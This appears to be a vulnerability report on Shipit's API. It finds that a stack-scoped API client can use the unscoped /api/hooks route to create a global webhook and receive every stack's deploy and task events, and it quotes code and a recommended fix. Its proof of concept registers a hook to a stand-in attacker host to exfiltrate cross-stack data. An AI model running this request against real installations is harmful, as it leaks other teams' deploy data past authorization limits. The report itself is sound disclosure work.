## Analog Vulnerability Found

### Title
Stack-scoped `ApiClient` can register a **global** hook to read all stacks' events - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
The NFTX report describes a privileged-but-limited actor (the vault manager) exploiting the absence of a bound check to affect scope well beyond what was intended (fee applied to *any* mint, not the manager's legitimate configuration range). The Shipit analog is an `ApiClient` that is deliberately scoped to a single stack (`ApiClient#stack_id`) being able to create a *global* `Hook` via the unscoped `/api/hooks` route, letting it receive delivery of events for every stack in the installation instead of just the one stack its token authorizes.

### Finding Description
`Shipit::ApiClient` can be scoped to a single stack: `stacks` in the base controller filters by `current_api_client.stack_id` when present. [1](#0-0) 

Permission enforcement, however, only checks the permission string (`read:hook`/`write:hook`) and never checks whether the api client is stack-scoped: [2](#0-1) 

`config/routes.rb` exposes two routes to the same `Api::HooksController`: one nested under a stack (`/api/stacks/*stack_id/hooks`) and one completely unscoped (`/api/hooks`): [3](#0-2) 

`HooksController#hooks` determines the scope purely from whether `params[:stack_id]` is present in the *request path*, not from the api client's own `stack_id`: [4](#0-3) 

When the client hits the unscoped route, `stack_id` is `nil`, so `hooks` resolves to `Hook.where(stack_id: nil)`, i.e. the **global** hooks scope, entirely bypassing the `stacks` restriction that would otherwise confine the client to its assigned stack. `Hook.deliver` then sends *every* declared event (`stack`, `task`, `deploy`, `rollback`, `commit_status`, `merge`, `pull_request`, etc.) for all stacks to any global hook: [5](#0-4) 

The binding that should hold is: `stack the ApiClient.stack_id authorizes == stack whose events the client's hooks touch`. Because `HooksController` derives the effective scope from the URL path rather than from `current_api_client.stack_id`, a client scoped to stack A can register/write a hook with `stack_id: nil` via `POST /api/hooks`, and that hook will subsequently receive event payloads (`Hook.coerce_payload` serializes stack/task/deploy objects, potentially including task `env` and other stack details) for every stack B, C, D... in the installation, breaking the equality.

### Impact Explanation
This is a scope-escalation: a credential intentionally restricted to a single stack (e.g. issued to a limited integration or team) gains passive read access to task/deploy/commit-status/merge events — and thus potentially sensitive data (task environment variables, deploy metadata, commit SHAs, links) — for every other stack managed by the Shipit instance. This matches "escalation into authorization... unauthenticated (here, out-of-scope) read of stack state, task streams or deploy output" for stacks the token was never authorized to touch.

### Likelihood Explanation
Any holder of a valid `ApiClient` token with `write:hook` permission and a `stack_id` restriction (a normal, expected configuration for handing out limited automation tokens) can trivially perform this by making one `POST /api/hooks` request instead of the intended `POST /api/stacks/:stack_id/hooks`. No special privilege beyond an ordinary scoped API token is required.

### Recommendation
In `Api::HooksController`, reject (403) any attempt to create/update a hook with `stack_id: nil` when `current_api_client.stack_id?` is true, or more generally derive the hook scope from `current_api_client.stack_id` (when present) rather than purely from the URL, so a stack-scoped client can never create or read global hooks.

### Proof of Concept
1. Provision an `ApiClient` with `stack_id: <stack A>.id` and permissions `['write:hook']` (a normal "limited" token for stack A's automation).
2. Authenticate as that client and send `POST /api/hooks` (the unscoped route) with `{delivery_url: "https://attacker.example.com", events: ["deploy", "task", "commit_status", "merge"]}`.
3. Because `params[:stack_id]` is absent on this route, `HooksController#stack_id` returns `nil`, and `hooks.create(params)` creates a `Hook` with `stack_id: nil` — a global hook.
4. From then on, `Hook.deliver` sends deploy/task/commit-status/merge events for **all** stacks (not just stack A) to the attacker's `delivery_url`, exfiltrating cross-stack deploy/task metadata that the client's `stack_id` scoping was meant to prevent it from ever seeing.

### Citations

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** app/models/shipit/api_client.rb (L38-45)
```ruby
    def check_permissions!(operation, scope)
      required_permission = "#{operation}:#{scope}"
      unless permissions.include?(required_permission)
        raise InsufficientPermission, "This operation requires the `#{required_permission}` permission"
      end

      true
    end
```

**File:** config/routes.rb (L27-46)
```ruby
    scope '/stacks/*stack_id', stack_id: stack_id_format, as: :stack do
      get '/ccmenu' => 'ccmenu#show', as: :ccmenu
      resource :lock, only: %i[create update destroy]
      resources :tasks, only: %i[index show] do
        resource :output, only: :show
        member do
          put :abort
        end
      end
      resources :deploys, only: %i[index create] do
        resources :release_statuses, only: %i[create]
      end
      resources :rollbacks, only: %i[create]
      resources :commits, only: %i[index]
      resources :merge_requests, only: %i[index show update destroy]
      post '/task/:task_name' => 'tasks#trigger', as: :trigger_task
      resources :hooks, only: %i[index create show update destroy]
    end

    resources :hooks, only: %i[index create show update destroy]
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L40-52)
```ruby
      private

      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
```

**File:** app/models/shipit/hook.rb (L93-119)
```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```
